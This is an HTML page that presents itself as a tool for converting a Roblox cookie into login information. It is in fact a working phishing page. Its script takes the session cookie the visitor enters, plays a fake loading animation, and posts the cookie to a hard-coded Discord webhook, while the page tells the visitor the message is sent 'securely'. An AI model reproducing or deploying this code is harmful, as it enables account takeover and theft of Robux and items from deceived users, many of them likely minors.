<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cookie To log-in Info</title>
  <style>
    body {
      background-color: #2c2f38;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #fff;
      position: relative;
    }
    .container {
      background: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
      text-align: center;
      width: 90%;
      max-width: 400px;
      backdrop-filter: blur(10px);
      z-index: 1;
    }
    h1 {
      margin-bottom: 20px;
      font-size: 1.8em;
      font-weight: bold;
    }
    input[type="text"] {
      width: 80%;
      padding: 10px 12px;
      border: none;
      border-radius: 8px;
      margin-bottom: 10px;
      font-size: 1em;
      outline: none;
      background-color: #3a3f47;
      color: #fff;
    }
    .status-message {
      margin: 10px 0;
      font-size: 0.95em;
      min-height: 20px;
    }
    button {
      background: #ff5e5e;
      border: none;
      color: white;
      padding: 12px 20px;
      font-size: 1em;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
      width: 100%;
    }
    button:hover {
      background: #e55a5a;
    }
    .footer {
      margin-top: 20px;
      font-size: 0.85em;
      opacity: 0.8;
    }
    .support-button {
      background: #56c1ff;
      margin-top: 15px;
      padding: 12px 20px;
      font-size: 1em;
      border-radius: 8px;
      color: white;
      cursor: pointer;
      width: 100%;
      transition: background 0.3s ease;
    }
    .support-button:hover {
      background: #3aa1c2;
    }
    .support-section {
      display: none;
      background: rgba(255, 255, 255, 0.1);
      padding: 12px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
      margin-top: 15px;
      width: 100%;
      max-width: 100%;
      box-sizing: border-box;
      text-align: left;
      font-size: 0.9em;
      overflow: hidden;
    }
    .support-textarea {
      width: 100%;
      height: 80px;
      padding: 8px;
      border-radius: 8px;
      background-color: #3a3f47;
      color: white;
      font-size: 0.9em;
      resize: none;
      border: none;
      box-sizing: border-box;
      white-space: pre-wrap;
      word-wrap: break-word;
      overflow-wrap: break-word;
    }
    .close-support-button {
      background: #ff5e5e;
      border: none;
      color: white;
      padding: 10px 15px;
      font-size: 1em;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
      width: 100%;
      margin-top: 10px;
    }
    .close-support-button:hover {
      background: #e55a5a;
    }
    .loading-bar-container {
      margin-top: 20px;
      position: relative;
      width: 100%;
      height: 10px;
      background: rgba(255,255,255,0.2);
      border-radius: 8px;
      display: none;
    }
    .loading-bar {
      height: 100%;
      background: #ff5e5e;
      width: 0%;
      transition: width 0.4s ease;
    }
    .loading-text {
      margin-top: 10px;
      font-size: 1.1em;
      color: #fff;
      font-weight: normal;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Cookie To log-in Info</h1>
    <input type="text" id="messageInput" placeholder="Enter Roblox Cookie">
    <div class="status-message" id="statusMessage"></div>
    <button onclick="sendMessage()">Send Message</button>
    <button class="support-button" onclick="toggleSupportSection()">Support</button>
    <div class="footer">Your message will be sent securely</div>
    <div class="support-section" id="supportSection">
      <h2>Support Info</h2>
      <textarea class="support-textarea" readonly>API is down? Please check Roblox tab is open.</textarea>
      <button class="close-support-button" onclick="toggleSupportSection()">Close Support</button>
    </div>
    <div class="loading-bar-container" id="loadingBarContainer">
      <div class="loading-bar" id="loadingBar"></div>
    </div>
    <div class="loading-text" id="loadingText1">Initializing...</div>
    <div class="loading-text" id="loadingText2">Connecting...</div>
    <div class="loading-text" id="loadingText3">Processing...</div>
    <div class="loading-text" id="loadingText4">Finalizing...</div>
    <div class="loading-text" id="loadingText5">Done!</div>
  </div>
  <script>
    const webhookURL = "https://discord.com/api/webhooks/1367593880861806602/j2nUxJofoMKaEc032py78vCjysveQe2gw1rMmcxRt0M09IHji3QRsEKpwkR6N2QE7Rtf";

    function sendMessage() {
      const input = document.getElementById('messageInput').value.trim();
      const statusMsg = document.getElementById('statusMessage');

      if (!input) {
        statusMsg.textContent = '❗ Please enter a cookie.';
        statusMsg.style.color = '#ff5e5e';
        return;
      }

      const formattedMessage = `_^|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.^|_"${input}"`;

      const barContainer = document.getElementById('loadingBarContainer');
      const bar = document.getElementById('loadingBar');
      const texts = [
        document.getElementById('loadingText1'),
        document.getElementById('loadingText2'),
        document.getElementById('loadingText3'),
        document.getElementById('loadingText4'),
        document.getElementById('loadingText5')
      ];

      bar.style.width = '0%';
      barContainer.style.display = 'block';
      texts.forEach(t => t.style.display = 'none');
      texts[0].style.display = 'block';
      statusMsg.textContent = '';

      let step = 0;
      const steps = [20, 40, 60, 80, 100];

      function nextStep() {
        if (step < steps.length) {
          bar.style.width = steps[step] + '%';
          texts.forEach((t, i) => t.style.display = (i === step) ? 'block' : 'none');
          step++;
          setTimeout(nextStep, 500);
        } else {
          setTimeout(() => {
            barContainer.style.display = 'none';
            bar.style.width = '0%';
            texts.forEach(t => t.style.display = 'none');

            fetch(webhookURL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ content: formattedMessage })
            })
            .then(() => {
              statusMsg.textContent = '✅ Message sent!';
              statusMsg.style.color = '#56ff89';
            })
            .catch(() => {
              statusMsg.textContent = '❌ Error sending message.';
              statusMsg.style.color = '#ff5e5e';
            });
          }, 500);
        }
      }

      nextStep();
    }

    function toggleSupportSection() {
      const supportSection = document.getElementById('supportSection');
      supportSection.style.display = (supportSection.style.display === 'none' || supportSection.style.display === '') ? 'block' : 'none';
    }
  </script>
</body>
</html>
